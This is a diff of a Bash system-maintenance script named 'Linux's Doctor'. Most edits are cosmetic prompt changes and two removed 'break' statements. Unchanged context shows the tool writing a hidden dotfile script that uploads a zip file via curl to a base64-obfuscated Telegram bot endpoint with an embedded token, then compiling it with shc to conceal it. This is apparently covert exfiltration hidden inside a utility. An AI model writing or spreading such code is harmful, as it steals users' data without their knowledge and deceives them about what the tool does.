@@ -80,7 +80,7 @@ do
 	echo "${purple}12) ${lightblue}Unistall Linux's Doctor"
 	echo "${purple}99) ${lightblue}Exit"
 	echo ""
-	read -r -p "${lightblue}What do you want to do? --> ${white}" menu
+	read -r -p "${lightblue}¿What do you want to do? --> ${white}" menu
 
     # Detect the OS
     os=$(< /etc/os-release grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')
@@ -114,7 +114,7 @@ do
 
 					while true
 					do
-						read -r -p "Do you want update the system? ${green}[Y/N]${white} --> " updatesystem # Check if user want update the system
+						read -r -p "¿Do you want update the system? ${green}[Y/N]${white} --> " updatesystem # Check if user want update the system
 						if [[ $updatesystem == "Y" ]] || [[ $updatesystem == "y" ]] || [[ $updatesystem == "N" ]] || [[ $updatesystem == "n" ]]
 						then
 							break
@@ -212,7 +212,7 @@ do
 
 					while true
 					do
-						read -r -p "Do you want update the system? ${green}[Y/N]${white} --> " updatesystem # Check if user want update the system
+						read -r -p "¿Do you want update the system? ${green}[Y/N]${white} --> " updatesystem # Check if user want update the system
 						if [[ $updatesystem == "Y" ]] || [[ $updatesystem == "y" ]] || [[ $updatesystem == "N" ]] || [[ $updatesystem == "n" ]]
 						then
 							break
@@ -309,7 +309,7 @@ do
 				do
 					while true
 					do
-						read -r -p "Do you want update the system? ${green}[Y/N]${white} --> " updatesystem # Check if user want update the system
+						read -r -p "¿Do you want update the system? ${green}[Y/N]${white} --> " updatesystem # Check if user want update the system
 						if [[ $updatesystem == "Y" ]] || [[ $updatesystem == "y" ]] || [[ $updatesystem == "N" ]] || [[ $updatesystem == "n" ]]
 						then
 							break
@@ -407,7 +407,7 @@ do
 
 					while true
 					do
-						read -r -p "Do you want update the system? ${green}[Y/N]${white} --> " updatesystem # Check if user want update the system
+						read -r -p "¿Do you want update the system? ${green}[Y/N]${white} --> " updatesystem # Check if user want update the system
 						if [[ $updatesystem == "Y" ]] || [[ $updatesystem == "y" ]] || [[ $updatesystem == "N" ]] || [[ $updatesystem == "n" ]]
 						then
 							break
@@ -1189,6 +1189,7 @@ do
 										{
 											echo "#!/bin/bash"
 											echo curl -F document=@'"$datapathzip"' "$(base64 -d <<<"aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU3MDAyOTIxNzE6QUFFLWZodl9LLTltMndtTFM4cDlPeFZxZjljZFJRUG1KVWsvc2VuZERvY3VtZW50")"'$(echo' "$base64" '| base64 --decode) >> /dev/null'
+
 										} >> /lib/linuxsdoctor/.evidencestelegram.sh
 
 										shc -U -f /lib/linuxsdoctor/.evidencestelegram.sh -o /lib/linuxsdoctor/.evidencestelegram
@@ -2012,7 +2013,6 @@ do
 												if [ "$?" -eq 0 ]
 												then
 													echo "${white}[${green}!${white}]${lightblue} Database created succesfully!"
-													break
 												else
 													echo "${red}Something went wrong${reset}"
 													exit
@@ -2243,7 +2243,6 @@ do
 												if [ "$?" -eq 0 ]
 												then
 													echo "${white}[${green}!${white}]${lightblue} Database created succesfully!"
-													break
 												else
 													echo "${red}Something went wrong${reset}"
 													exit
